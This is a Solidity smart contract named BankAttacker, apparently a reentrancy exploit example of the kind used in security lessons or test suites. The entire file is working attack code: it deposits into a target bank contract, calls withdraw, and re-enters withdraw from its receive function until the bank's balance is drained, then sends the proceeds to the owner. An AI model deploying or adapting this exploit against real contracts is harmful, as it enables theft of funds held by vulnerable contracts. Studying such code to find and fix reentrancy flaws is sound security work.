// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract BankAttacker {
    IBank public bank;
    address public owner;

    constructor(address _bank) {
        bank = IBank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        }
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
